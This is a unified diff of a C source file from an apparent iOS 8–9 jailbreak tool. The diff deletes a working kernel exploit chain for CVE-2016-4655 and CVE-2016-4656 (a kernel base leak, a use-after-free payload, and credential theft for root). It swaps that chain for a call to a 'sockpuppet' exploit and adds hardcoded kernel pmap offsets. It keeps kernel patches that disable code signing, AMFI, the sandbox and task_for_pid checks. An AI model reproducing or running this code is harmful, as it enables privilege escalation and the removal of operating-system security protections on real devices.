@@ -6,6 +6,7 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/syscall.h>
+#include <sys/utsname.h>
 #include <sys/kauth.h>
 #include <sys/mount.h>
 #include <spawn.h>
@@ -15,16 +16,11 @@
 #include <mach/mach.h>
 #include <IOKit/IOKitLib.h>
 
-#include "offsets.h"
+#include "sock_port_2_legacy/sockpuppet.h"
 #include "patchfinder.h"
 
 #define NEWFILE  (O_WRONLY|O_SYNC)
 #define CONSOLE "/dev/console"
-
-#define PAYLOAD_TO_PEXPLOIT (-76)
-#define PEXPLOIT_TO_UAF_PAYLOAD 8
-#define kOSSerializeBinarySignature "\323\0\0"
-#define WRITE_IN(buf, data) do { *(uint32_t *)(buf+bufpos) = (data); bufpos+=4; } while(0)
 
 #define TTB_SIZE            4096
 #define L1_SECT_S_BIT       (1 << 16)
@@ -42,23 +38,14 @@
 
 #define CHUNK_SIZE 0x800
 
-#define KERNEL_BASE_ADDRESS (0x80001000)
-
+struct utsname u = { 0 };
 char *lockfile;
 int fd;
 int fildes[2];
-uint32_t cpipe;
 uint32_t pipebuf;
 clock_serv_t clk_battery;
 clock_serv_t clk_realtime;
-unsigned char pExploit[128];
-vm_offset_t vm_kernel_addrperm;
 uint32_t write_gadget;
-
-uint32_t* offsets = NULL;
-
-uint32_t myproc=0;
-uint32_t mycred=0;
 
 uint32_t tte_virt;
 uint32_t tte_phys;
@@ -77,7 +64,7 @@ kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_
 
 mach_port_t tfp0;
 int isIOS9=0;
-int isA6=0;
+int isA5=0;
 
 void copyin(void* to, uint32_t from, size_t size) {
     mach_vm_size_t outsize = size;
@@ -138,44 +125,6 @@ uint32_t write_primitive_dword_tfp0(uint32_t addr, uint32_t val) {
     return val;
 }
 
-enum
-{
-    kOSSerializeDictionary   = 0x01000000U,
-    kOSSerializeArray        = 0x02000000U,
-    kOSSerializeSet          = 0x03000000U,
-    kOSSerializeNumber       = 0x04000000U,
-    kOSSerializeSymbol       = 0x08000000U,
-    kOSSerializeString       = 0x09000000U,
-    kOSSerializeData         = 0x0a000000U,
-    kOSSerializeBoolean      = 0x0b000000U,
-    kOSSerializeObject       = 0x0c000000U,
-    kOSSerializeTypeMask     = 0x7F000000U,
-    kOSSerializeDataMask     = 0x00FFFFFFU,
-    kOSSerializeEndCollecton = 0x80000000U,
-};
-
-unsigned char clock_ops_overwrite[] = {
-    0x00, 0x00, 0x00, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
-    0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
-    0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
-    0x00, 0x00, 0x00, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1)
-    0x00, 0x00, 0x00, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1)
-};
-
-
-unsigned char uaf_payload_buffer[] = {
-    0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
-    0x00, 0x00, 0x00, 0x00, // [04] address of clock_ops array in kern memory
-    0x00, 0x00, 0x00, 0x00, // [08] address of _copyin
-    0x00, 0x00, 0x00, 0x00, // [0C] NULL
-    0x00, 0x00, 0x00, 0x00, // [10] address of OSSerializer::serialize (+1)
-    0x00, 0x00, 0x00, 0x00, // [14] address of "BX LR" code fragment
-    0x00, 0x00, 0x00, 0x00, // [18] NULL
-    0x00, 0x00, 0x00, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
-    0x00, 0x00, 0x00, 0x00, // [20] address of "BX LR" code fragment
-    0x00, 0x00, 0x00, 0x00, // [24] address of "BX LR" code fragment
-};
-
 void init(void){
     
 #ifdef UNTETHER
@@ -223,193 +172,6 @@ void initialize(void) {
     if (kr != KERN_SUCCESS) {
         printf("[-] err: %d\n", err_get_code(kr));
     }
-}
-
-
-// CVE-2016-4655
-uint32_t leak_kernel_base(void){
-    
-    printf("[*] running CVE-2016-4655\n");
-    
-    char data[4096];
-    uint32_t bufpos = 0;
-    
-    memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
-    bufpos += sizeof(kOSSerializeBinarySignature);
-    
-    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollecton | 2);
-    
-    WRITE_IN(data, kOSSerializeSymbol | 30);
-    WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingSrc"
-    WRITE_IN(data, 0x6f627965);
-    WRITE_IN(data, 0x4d647261);
-    WRITE_IN(data, 0x6669646f);
-    WRITE_IN(data, 0x4d726569);
-    WRITE_IN(data, 0x69707061);
-    WRITE_IN(data, 0x7253676e);
-    WRITE_IN(data, 0x00000063);
-    WRITE_IN(data, kOSSerializeNumber | 2048);
-    WRITE_IN(data, 0x00000004);
-    WRITE_IN(data, 0x00000000);
-    
-    WRITE_IN(data, kOSSerializeSymbol | 30);
-    WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingDst"
-    WRITE_IN(data, 0x6f627965);
-    WRITE_IN(data, 0x4d647261);
-    WRITE_IN(data, 0x6669646f);
-    WRITE_IN(data, 0x4d726569);
-    WRITE_IN(data, 0x69707061);
-    WRITE_IN(data, 0x7344676e);
-    WRITE_IN(data, 0x00000074);
-    WRITE_IN(data, kOSSerializeNumber | kOSSerializeEndCollecton | 32);
-    WRITE_IN(data, 0x00000193);
-    WRITE_IN(data, 0X00000000);
-    
-    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleKeyStore"));
-    io_connect_t connection;
-    kern_return_t result;
-    
-    io_service_open_extended(service, mach_task_self(), 0, NDR_record, data, bufpos, &result, &connection);
-    if (result != KERN_SUCCESS) {
-        printf("[-] err: %d\n", err_get_code(result));
-    }
-    
-    io_object_t object = 0;
-    uint32_t size = sizeof(data);
-    io_iterator_t iterator;
-    IORegistryEntryGetChildIterator(service, "IOService", &iterator);
-    
-    do {
-        if (object) {
-            IOObjectRelease(object);
-        }
-        object = IOIteratorNext(iterator);
-    } while (IORegistryEntryGetProperty(object, "HIDKeyboardModifierMappingSrc", data, &size));
-    
-    if (size > 8) {
-        int i;
-        for (i=0; i<size; i++) {
-            if (i % 4 == 0) {
-                //printf("\n");
-            }
-            //printf("%02x ", (unsigned char)data[i]);
-        }
-        //printf("\n");
-        
-        return (*(uint32_t *)(data+36) & 0xFFF00000) + 0x1000;
-    }
-    return 0;
-}
-
-void *insert_payload(void *ptr) {
-    char stackAnchor;
-    uint32_t bufpos; // unsigned int size;
-    //char buffer[4096];
-    char buffer[5120];
-    int v26;
-    mach_port_t connection;
-    kern_return_t result;
-    mach_port_t masterPort;
-    
-    char *p = (char *)((unsigned int)&stackAnchor & 0xFFFFF000);
-    // kauth_filesec.fsec_magic
-    *(uint32_t *)(p + 0xEC0) = 0x12CC16D;
-    // kauth_filesec.fsec_acl.entrycount = KAUTH_FILESEC_NOACL
-    *(uint32_t *)(p + 0xEE4) = -1;
-    // kauth_filesec.fsec_acl.acl_ace[...]
-    memcpy((void *)(((unsigned int)&stackAnchor & 0xFFFFF000) | 0xEEC), pExploit, 128);
-    
-    memcpy(buffer, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
-    bufpos = sizeof(kOSSerializeBinarySignature);
-    
-    WRITE_IN(buffer, kOSSerializeDictionary | kOSSerializeEndCollecton | 2);
-    
-    WRITE_IN(buffer, kOSSerializeSymbol | 128);
-    // "ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara"
-    for (v26=0; v26<124; v26+=4) {
-        WRITE_IN(buffer, 0x72617261);
-    }
-    WRITE_IN(buffer, 0x00617261);
-    WRITE_IN(buffer, kOSSerializeNumber | 2048);
-    WRITE_IN(buffer, 0x00000004);
-    WRITE_IN(buffer, 0X00000000);
-    
-    WRITE_IN(buffer, kOSSerializeSymbol | 30);
-    WRITE_IN(buffer, 0x4b444948); // "HIDKeyboardModifierMappingDst"
-    WRITE_IN(buffer, 0x6f627965);
-    WRITE_IN(buffer, 0x4d647261);
-    WRITE_IN(buffer, 0x6669646f);
-    WRITE_IN(buffer, 0x4d726569);
-    WRITE_IN(buffer, 0x69707061);
-    WRITE_IN(buffer, 0x7344676e);
-    WRITE_IN(buffer, 0x00000074);
-    WRITE_IN(buffer, kOSSerializeNumber | kOSSerializeEndCollecton | 32);
-    WRITE_IN(buffer, 0x00000193);
-    WRITE_IN(buffer, 0x00000000);
-    
-    masterPort = kIOMasterPortDefault;
-    
-    io_service_t service = IOServiceGetMatchingService(masterPort, IOServiceMatching("AppleKeyStore"));
-    
-    io_service_open_extended(service, mach_task_self(), 0, NDR_record, buffer, bufpos, &result, &connection);
-    if (result != KERN_SUCCESS) {
-        printf("[-] err: %d\n", err_get_code(result));
-    }
-    
-    io_object_t object = 0;
-    uint32_t size = sizeof(buffer);
-    io_iterator_t iterator;
-    IORegistryEntryGetChildIterator(service, "IOService", &iterator);
-    uint32_t *args = (uint32_t *)ptr;
-    uint32_t kernel_base = *args;
-    uint32_t payload_ptr = 0;
-    
-    do {
-        if (object) {
-            IOObjectRelease(object);
-        }
-        object = IOIteratorNext(iterator);
-    } while (IORegistryEntryGetProperty(object, "ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara", buffer, &size));
-    
-    if (size > 8) {
-        int i;
-        for (i=0; i<size; i++) {
-            if (i % 4 == 0) {
-                //printf("\n");
-            }
-            //printf("%02x ", (unsigned char)buffer[i]);
-        }
-        //printf("\n");
-        if(!isA6&&!isIOS9){
-            payload_ptr = *(uint32_t *)(buffer+12); // ?
-        } else {
-            payload_ptr = *(uint32_t *)(buffer+16);
-        }
-    }
-    
-    *(uint32_t *)clock_ops_overwrite = kernel_base + koffset(offsetof_OSSerializer_serialize) + 1;
-    *(uint32_t *)(clock_ops_overwrite+0xC) = kernel_base + koffset(offsetof_calend_gettime) + 1;
-    *(uint32_t *)(clock_ops_overwrite+0x10) = kernel_base + koffset(offsetof_bufattr_cpx) + 1;
-    
-    *(uint32_t *)uaf_payload_buffer = (uint32_t)clock_ops_overwrite;
-    *(uint32_t *)(uaf_payload_buffer+0x4) = kernel_base + koffset(offsetof_clock_ops);
-    *(uint32_t *)(uaf_payload_buffer+0x8) = kernel_base + koffset(offsetof_copyin);
-    *(uint32_t *)(uaf_payload_buffer+0x10) = kernel_base + koffset(offsetof_OSSerializer_serialize) + 1;
-    *(uint32_t *)(uaf_payload_buffer+0x14) = kernel_base + koffset(offsetof_bx_lr);
-    *(uint32_t *)(uaf_payload_buffer+0x1C) = kernel_base + koffset(offsetof_OSSymbol_getMetaClass) + 1;
-    *(uint32_t *)(uaf_payload_buffer+0x20) = kernel_base + koffset(offsetof_bx_lr);
-    *(uint32_t *)(uaf_payload_buffer+0x24) = kernel_base + koffset(offsetof_bx_lr);
-    
-    memcpy(pExploit+PEXPLOIT_TO_UAF_PAYLOAD, uaf_payload_buffer, sizeof(uaf_payload_buffer));
-    memcpy(pExploit+PEXPLOIT_TO_UAF_PAYLOAD+sizeof(uaf_payload_buffer), clock_ops_overwrite, sizeof(clock_ops_overwrite));
-    
-    // kauth_filesec.fsec_acl.acl_ace[...]
-    memcpy((void *)(((unsigned int)&stackAnchor & 0xFFFFF000) | 0xEEC), pExploit, 128);
-    *(uint32_t *)(args[1]) = payload_ptr;
-    
-    int ret = syscall(SYS_open_extended, lockfile, O_WRONLY | O_EXLOCK, KAUTH_UID_NONE, KAUTH_GID_NONE, 0644, p + 0xEC0);
-    assert(ret != -1);
-    return NULL;
 }
 
 void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2) {
@@ -471,173 +233,6 @@ void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
             continue;
         bcopy((uint8_t *)buf, dest + e, CHUNK_SIZE);
     }
-}
-
-void do_exploit(uint32_t kernel_base){
-    printf("[*] running CVE-2016-4656\n");
-    
-    pthread_t insert_payload_thread;
-    volatile uint32_t payload_ptr = 0x12345678;
-    uint32_t args[] = {kernel_base, (uint32_t)&payload_ptr};
-    
-    char data[4096];
-    uint32_t bufpos = 0;
-    mach_port_t master = 0, res;
-    kern_return_t kr;
-    struct stat buf;
-    mach_port_name_t kernel_task;
-    
-    int r = pthread_create(&insert_payload_thread, NULL, &insert_payload, args);
-    assert(r == 0);
-    
-    while (payload_ptr == 0x12345678);
-    printf("[*] payload ptr: %p\n", (void *)payload_ptr);
-    
-    // CVE-2016-4656
-    memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
-    bufpos += sizeof(kOSSerializeBinarySignature);
-    
-    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollecton | 0x10);
-    
-    {
-        /* pre-9.1 doesn't accept strings as keys, but duplicate keys :D */
-        WRITE_IN(data, kOSSerializeSymbol | 4);
-        WRITE_IN(data, 0x00327973);                 // "sy2"
-        /* our key is a OSString object that will be freed */
-        WRITE_IN(data, kOSSerializeString | 4);
-        WRITE_IN(data, 0x00327973);                 // irrelevant
-        
-        /* now this will free the string above */
-        WRITE_IN(data, kOSSerializeObject | 1);     // ref to "sy2"
-        WRITE_IN(data, kOSSerializeBoolean | 1);    // lightweight value
-        
-        /* and this is the key for the value below */
-        WRITE_IN(data, kOSSerializeObject | 1);     // ref to "sy2" again
-    }
-    
-    WRITE_IN(data, kOSSerializeData | 0x14);
-    WRITE_IN(data, payload_ptr+PAYLOAD_TO_PEXPLOIT+PEXPLOIT_TO_UAF_PAYLOAD);    // [00] address of uaf_payload_buffer
-    WRITE_IN(data, 0x41414141);                                                 // [04] dummy
-    WRITE_IN(data, payload_ptr+PAYLOAD_TO_PEXPLOIT);                            // [08] address of uaf_payload_buffer - 8
-    WRITE_IN(data, 0x00000014);                                                 // [0C] static value of 20
-    WRITE_IN(data, kernel_base + koffset(offsetof_OSSerializer_serialize) +1);  // [10] address of OSSerializer::serialize (+1)
-    
-    /* now create a reference to object 1 which is the OSString object that was just freed */
-    WRITE_IN(data, kOSSerializeObject | kOSSerializeEndCollecton | (1 ? 2 : 1));
-    
-    /* get a master port for IOKit API */
-    host_get_io_master(mach_host_self(), &master);
-    
-    /* trigger the bug */
-    kr = io_service_get_matching_services_bin(master, data, bufpos, &res);
-    printf("[*] kr: %x\n", kr);
-    
-    /* test read primitive */
-    assert(read_primitive(kernel_base) == 0xfeedface);
-    vm_kernel_addrperm = read_primitive(kernel_base + koffset(offsetof_vm_kernel_addrperm));
-
-    /* pipe test */
-    assert(fstat(fildes[0], &buf) != -1);
-    cpipe = (uint32_t)(buf.st_ino - vm_kernel_addrperm);
-    
-    write(fildes[1], "ABCDEFGH", 8);
-    assert(read_primitive(cpipe) == 8);
-    pipebuf = read_primitive(cpipe+16);
-    assert(read_primitive(pipebuf) == 0x44434241); // "ABCD"
-    assert(read_primitive(pipebuf+4) == 0x48474645); // "EFGH"
-    
-    read(fildes[0], data, 4096);
-    
-    /* test write primitive */
-    write_gadget = kernel_base + koffset(offsetof_write_gadget);
-    
-    write_primitive(pipebuf, 0x41424142);
-    assert(read_primitive(pipebuf) == 0x41424142);
-    
-    /* find kernel pmap */
-    uint32_t kernel_pmap = koffset(offsetof_kernel_pmap) + kernel_base;
-    uint32_t kernel_pmap_store = read_primitive(kernel_pmap);
-    tte_virt = read_primitive(kernel_pmap_store);
-    tte_phys = read_primitive(kernel_pmap_store+4);
-    flush_dcache = koffset(offsetof_flush_dcache) + kernel_base;
-    invalidate_tlb = koffset(offsetof_invalidate_tlb) + kernel_base;
-    printf("[OF] kernel pmap: %08x\n", kernel_pmap);
-    printf("[*] kernel pmap store: %08x\n", kernel_pmap_store);
-    printf("[*] tte_virt: %08x\n", tte_virt);
-    printf("[*] tte_phys: %08x\n", tte_phys);
-    
-    pid_t uid = getuid();
-    //if(uid != 0){
-        // elevation to root privilege by xerub
-        uint32_t kproc = 0;
-        myproc = 0;
-        mycred = 0;
-        pid_t mypid = getpid();
-        pid_t myuid = getuid();
-        uint32_t proc = read_primitive(kernel_base + koffset(offsetof_allproc));
-        while (proc) {
-            uint32_t pid = read_primitive(proc + koffset(offsetof_p_pid));
-            if (pid == mypid) {
-                myproc = proc;
-            } else if (pid == 0) {
-                kproc = proc;
-            }
-            proc = read_primitive(proc);
-        }
-        mycred = read_primitive(myproc + koffset(offsetof_p_ucred));
-        uint32_t kcred = read_primitive(kproc + koffset(offsetof_p_ucred));
-        write_primitive(myproc + koffset(offsetof_p_ucred), kcred);
-        setuid(0);
-        printf("[*] I am god?: %x\n", getuid());
-    //}
-    
-    /* task_for_pid */
-    uint32_t task_for_pid_base = koffset(offsetof_task_for_pid) + kernel_base;
-    uint32_t pid_check_addr = koffset(offsetof_pid_check) + task_for_pid_base;
-    printf("[OF] pid_check_addr: %08x\n", pid_check_addr);
-    
-    patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
-    
-    //if(!isIOS9){
-    //    uint32_t pid_check_val = read_primitive(pid_check_addr);
-    //    pid_check_val |= 0xff;
-    //    write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
-    //} else {
-        write_primitive(pid_check_addr, 0xbf00bf00); // beq -> NOP
-    //}
-
-    usleep(100000);
-    
-    uint32_t posix_check_ret_addr;
-    uint32_t posix_check_ret_val;
-    uint32_t mac_proc_check_ret_addr;
-    uint32_t mac_proc_check_ret_val;
-    //if(uid != 0){
-        posix_check_ret_addr = koffset(offsetof_posix_check) + task_for_pid_base;
-        posix_check_ret_val = read_primitive(posix_check_ret_addr);
-        patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, posix_check_ret_addr & ~0xFFF);
-        write_primitive(posix_check_ret_addr, posix_check_ret_val + 0xff); // cmp r0, #ff
-        
-        mac_proc_check_ret_addr = koffset(offsetof_mac_proc_check) + task_for_pid_base;
-        mac_proc_check_ret_val = read_primitive(mac_proc_check_ret_addr);
-        patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, mac_proc_check_ret_addr & ~0xFFF);
-        write_primitive(mac_proc_check_ret_addr, mac_proc_check_ret_val | 0x10000); // cmp.w r8, #1
-    //}
-    
-    exec_primitive(flush_dcache, 0, 0);
-    
-    usleep(100000);
-    
-    task_for_pid(mach_task_self(), 0, &kernel_task);
-    tfp0 = kernel_task;
-    
-    //if(uid != 0){
-        write_primitive_dword_tfp0(posix_check_ret_addr, posix_check_ret_val);
-        write_primitive_dword_tfp0(mac_proc_check_ret_addr, mac_proc_check_ret_val);
-        exec_primitive(flush_dcache, 0, 0);
-        usleep(100000);
-    //}
-    
 }
 
 void patch_bootargs(uint32_t addr){
@@ -730,6 +325,49 @@ make_bl(int pos, int tgt)
     return (unsigned int)pfx | ((unsigned int)sfx << 16);
 }
 
+uint32_t find_kernel_pmap(uintptr_t kernel_base) {
+    uint32_t pmap_addr;
+
+    if(isA5) {
+        //A5 or A5X
+        printf("A5(X) ");
+        if (strstr(u.version, "3248")) { //9.0-9.0.2
+            printf("9.0-9.0.2\n");
+            pmap_addr = 0x3f7444;
+        } else if (strstr(u.version, "2784")) { //8.3-8.4.1
+            printf("8.3-8.4.1\n");
+            pmap_addr = 0x3a211c;
+        } else if (strstr(u.version, "2783.5")) { //8.2
+            printf("8.2\n");
+            pmap_addr = 0x39411c;
+        } else if (strstr(u.version, "2783.3.26")) { //8.1.3
+            printf("8.1.3\n");
+            pmap_addr = 0x39211c;
+        } else { //8.0-8.1.2
+            printf("8.0-8.1.2\n");
+            pmap_addr = 0x39111c;
+        }
+    } else {
+        //A6 or A6X
+        printf("A6(X) ");
+        if (strstr(u.version, "3248")) { //9.0-9.0.2
+            printf("9.0-9.0.2\n");
+            pmap_addr = 0x3fd444;
+        } else if (strstr(u.version, "2784")) { //8.3-8.4.1
+            printf("8.3-8.4.1\n");
+            pmap_addr = 0x3a711c;
+        } else if (strstr(u.version, "2783.5")) { //8.2
+            printf("8.2\n");
+            pmap_addr = 0x39a11c;
+        } else { //8.0-8.1.3
+            printf("8.0-8.1.3\n");
+            pmap_addr = 0x39711c;
+        }
+    }
+    printf("using offset 0x%08x for pmap\n",pmap_addr);
+    return pmap_addr + kernel_base;
+}
+
 void unjail8(uint32_t kbase){
     printf("[*] jailbreaking...\n");
     
@@ -740,6 +378,7 @@ void unjail8(uint32_t kbase){
     
     /* patchfinder */
     printf("[*] running patchfinder\n");
+    //uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
     uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
     uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
     uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1(kbase, kdata, ksize);
@@ -756,7 +395,12 @@ void unjail8(uint32_t kbase){
     uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
     uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
     uint32_t csops2_addr = kbase + find_csops2(kbase, kdata, ksize);
+    flush_dcache = kbase + find_flush_dcache(kbase, kdata, ksize);
+    invalidate_tlb = kbase + find_invalidate_tlb(kbase, kdata, ksize);
+    //uint32_t kernel_pmap = kbase + find_pmap_location(kbase, kdata, ksize);
+    uint32_t kernel_pmap = find_kernel_pmap(kbase);
     
+    //printf("[PF] tfp0_patch:                 %08x\n", tfp0_patch);
     printf("[PF] proc_enforce:               %08x\n", proc_enforce);
     printf("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
     printf("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
@@ -773,44 +417,69 @@ void unjail8(uint32_t kbase){
     printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
     printf("[PF] csops:                      %08x\n", csops_addr);
     printf("[PF] csops2:                     %08x\n", csops2_addr);
-    
+    printf("[PF] flush_dcache:               %08x\n", flush_dcache);
+    printf("[PF] invalidate_tlb:             %08x\n", invalidate_tlb);
+    printf("[PF] kernel_pmap:                %08x\n", kernel_pmap);
+
+    printf("[*] get kernel_pmap_store, tte_virt, tte_phys\n");
+    uint32_t kernel_pmap_store = read_primitive_dword_tfp0(kernel_pmap);
+    tte_virt = read_primitive_dword_tfp0(kernel_pmap_store);
+    tte_phys = read_primitive_dword_tfp0(kernel_pmap_store+4);
+    printf("[*] kernel pmap store @ 0x%08x\n", kernel_pmap_store);
+    printf("[*] kernel pmap tte is at VA 0x%08x PA 0x%08x\n", tte_virt, tte_phys);
+
     printf("[*] running kernelpatcher\n");
     
+    /* tfp0_patch: set NOP */
+    //printf("[*] tfp0_patch\n");
+    //patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (tfp0_patch & ~0xFFF));
+    //write_primitive_dword_tfp0(tfp0_patch, 0xbf00bf00);
+
     /* proc_enforce: -> 0 */
+    printf("[*] proc_enforce\n");
     write_primitive_dword_tfp0(proc_enforce, 0);
     
     /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
+    printf("[*] cs_enforcement_disable_amfi\n");
     write_primitive_byte_tfp0(cs_enforcement_disable_amfi, 1);
     write_primitive_byte_tfp0(cs_enforcement_disable_amfi-4, 1);
     
     /* debug_enabled -> 1 */
+    printf("[*] debug_enabled\n");
     write_primitive_dword_tfp0(PE_i_can_has_debugger_1, 1);
     write_primitive_dword_tfp0(PE_i_can_has_debugger_2, 1);
     
     /* bootArgs */
+    printf("[*] bootargs\n");
     patch_bootargs(p_bootargs);
     
     /* vm_fault_enter */
+    printf("[*] vm_fault_enter\n");
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_fault_enter & ~0xFFF));
     write_primitive_dword_tfp0(vm_fault_enter, 0x2201bf00);
     
     /* vm_map_enter */
+    printf("[*] vm_map_enter\n");
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_enter & ~0xFFF));
     write_primitive_dword_tfp0(vm_map_enter, 0x4280bf00);
     
     /* vm_map_protect: set NOP */
+    printf("[*] vm_map_protect\n");
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_protect & ~0xFFF));
     write_primitive_dword_tfp0(vm_map_protect, 0xbf00bf00);
     
     /* mount patch */
+    printf("[*] mount patch\n");
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mount_patch & ~0xFFF));
     write_primitive_byte_tfp0(mount_patch, 0xe0);
     
     /* mapForIO: prevent kIOReturnLockedWrite error */
+    printf("[*] mapForIO\n");
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mapForIO & ~0xFFF));
     write_primitive_dword_tfp0(mapForIO, 0xbf00bf00);
     
     /* csops */
+    printf("[*] csops\n");
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops_addr & ~0xFFF));
     write_primitive_dword_tfp0(csops_addr, 0xbf00bf00);
     
@@ -818,6 +487,7 @@ void unjail8(uint32_t kbase){
     write_primitive_byte_tfp0(csops2_addr, 0x20);
     
     /* sandbox */
+    printf("[*] sandbox\n");
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sandbox_call_i_can_has_debugger & ~0xFFF));
     write_primitive_dword_tfp0(sandbox_call_i_can_has_debugger, 0xbf00bf00);
     
@@ -871,13 +541,16 @@ void unjail8(uint32_t kbase){
     memcpy(sandbox_payload, taig32_payload, payload_len);
     
     // hook sb_evaluate
+    printf("[*] sb_evaluate\n");
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, ((kbase + payload_base) & ~0xFFF));
     copyout((kbase + payload_base), sandbox_payload, payload_len);
     
+    printf("[*] sb_evaluate_hook\n");
     uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sb_patch & ~0xFFF));
     write_primitive_dword_tfp0(sb_patch, sb_evaluate_hook);
     
+    printf("[*] flush dcache\n");
     exec_primitive(flush_dcache, 0, 0);
     
     printf("enable patched.\n");
@@ -1091,27 +764,12 @@ void load_jb(void){
     
     usleep(100000);
     
+    // looks like this doesnt work with jsc untether, will use daemonloader instead, launched by dirhelper above
     jl = "/bin/launchctl";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/LaunchDaemons", NULL }, NULL);
-    
-#ifdef UNTETHER
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/NanoLaunchDaemons", NULL }, NULL);
     
     usleep(10000);
-    
-    jl = "/usr/libexec/CrashHousekeeping_o";
-    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, NULL }, NULL);
-    if(isIOS9){
-        waitpid(pd, NULL, 0);
-    }
-
-#endif
-    
-#ifdef RELOADER
-    jl = "/usr/bin/killall";
-    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "-9", "backboardd", NULL }, NULL);
-#endif
-
 }
 
 void failed(void){
@@ -1121,16 +779,24 @@ void failed(void){
 }
 
 int main(void){
+    uname(&u);
+    printf("kern.version: %s\n", u.version);
+
+    if (strstr(u.version, "3248")) {
+        printf("isIOS9? yes\n");
+        isIOS9=1;
+    }
+
+    if (strstr(u.version, "S5L894")) {
+        printf("isA5? yes\n");
+        isA5=1;
+    }
     
     init();
-    
-    offsets_init();
     initialize();
-    
-    uint32_t kernel_base = leak_kernel_base();
-    printf("[*] kernel_base: %x\n", kernel_base);
-    
-    do_exploit(kernel_base);
+
+    uint32_t kernel_base;
+    tfp0 = exploit(&kernel_base);
     
     if(tfp0){
         printf("[*] got tfp0: %x\n", tfp0);
@@ -1150,10 +816,5 @@ int main(void){
     
     printf("[*] DONE!\n");
 
-    if(myproc){
-        write_primitive(myproc + koffset(offsetof_p_ucred), mycred);
-        setuid(501);
-    }
-    
     return 0;
 }
